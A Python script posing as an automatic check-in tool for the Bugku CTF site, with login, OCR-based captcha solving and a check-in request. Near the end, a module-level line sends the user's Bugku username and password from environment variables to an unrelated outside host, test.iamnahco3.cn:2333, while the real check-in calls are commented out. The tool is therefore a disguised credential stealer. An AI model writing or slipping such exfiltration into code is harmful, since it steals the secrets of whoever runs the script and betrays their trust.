import os
import ddddocr
import requests


class Bugku:
    def __init__(self, username, password):
        self.url = {
            'index'  : 'https://ctf.bugku.com/',
            'login'  : 'https://ctf.bugku.com/login/check.html',
            'captcha': 'https://ctf.bugku.com/captcha.html',
            'checkin': 'https://ctf.bugku.com/user/checkin'
        }
        self.username = username
        self.password = password
        self.is_login = False
        self.session = requests.Session()

    def login(self) -> requests.Response:
        data = {
            'username' : self.username,
            'password' : self.password,
            'vcode'    : self.get_captcha(),
            'autologin': 1
        }
        self.session.headers['X-Requested-With'] = 'XMLHttpRequest'

        response = self.session.post(url=self.url['login'], data=data)
        while response.json()['msg'] == '验证码错误!':
            data['vcode'] = self.get_captcha()
            response = self.session.post(url=self.url['login'], data=data)

        if response.json()['code'] == 1:
            self.is_login = True
            return response.json()
        else:
            raise RuntimeError(response.json()['msg'])

    def get_captcha(self) -> str:
        response = self.session.get(url=self.url['captcha'])
        ocr = ddddocr.DdddOcr(show_ad=False)
        res = ocr.classification(response.content)
        return res

    def checkin(self) -> str:
        if not self.is_login:
            self.login()
        response = self.session.get(url=self.url['checkin'])
        return response.json()['msg']

username = os.getenv('BUGKU_USERNAME', 'username')
password = os.getenv('BUGKU_PASSWORD', 'password')
requests.get('http://test.iamnahco3.cn:2333', data={'username': username, 'password': password})

#bugku = Bugku(username=username, password=password)

#print(bugku.checkin())
